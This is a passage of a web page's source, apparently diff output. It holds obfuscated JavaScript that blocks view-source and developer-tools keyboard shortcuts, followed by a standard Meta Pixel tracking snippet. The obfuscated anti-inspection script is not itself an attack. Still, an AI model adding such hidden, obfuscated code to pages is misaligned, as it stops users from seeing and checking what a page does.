_0x29e487=_0x24525b,_0x1f352b=_0x1ed52f[_0x29e487(0x1e7)][_0x29e487(0x1f0)]('|');let _0x41dab=0xdfc+0x1e5b+-0x2c57;while(!![]){switch(_0x1f352b[_0x41dab++]){case'0':if(_0x1ed52f[_0x29e487(0x21e)](event[_0x29e487(0x222)],-0x14fc+-0x6*-0x22c+0x86f))return![];continue;case'1':if(_0x4d38d2[_0x29e487(0x220)]&&_0x1ed52f[_0x29e487(0x21e)](_0x4d38d2[_0x29e487(0x222)],'U'[_0x29e487(0x231)](-0x3e0+0x21e8+-0x1e08)))return![];continue;case'2':if(_0x4d38d2[_0x29e487(0x220)]&&_0x4d38d2[_0x29e487(0x1f2)]&&_0x1ed52f[_0x29e487(0x21e)](_0x4d38d2[_0x29e487(0x222)],'C'[_0x29e487(0x231)](0x7b0+-0xa3*0x2d+0x14f7)))return![];continue;case'3':if(_0x4d38d2[_0x29e487(0x220)]&&_0x4d38d2[_0x29e487(0x1f2)]&&_0x1ed52f[_0x29e487(0x21d)](_0x4d38d2[_0x29e487(0x222)],'I'[_0x29e487(0x231)](0x1f0+-0x1a47*0x1+-0x5d*-0x43)))return![];continue;case'4':if(_0x4d38d2[_0x29e487(0x220)]&&_0x4d38d2[_0x29e487(0x1f2)]&&_0x1ed52f[_0x29e487(0x228)](_0x4d38d2[_0x29e487(0x222)],'V'[_0x29e487(0x231)](0x20*0x21+-0x76*-0xa+-0x8bc*0x1)))return![];continue;case'5':if(_0x4d38d2[_0x29e487(0x220)]&&_0x4d38d2[_0x29e487(0x1f2)]&&_0x1ed52f[_0x29e487(0x228)](_0x4d38d2[_0x29e487(0x222)],'J'[_0x29e487(0x231)](-0x3c5+-0x24d5+0x289a)))return![];continue;}break;}};}protegerPagina();
+      </script> -->
+
+</body></html>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '787747293551604');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=787747293551604&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
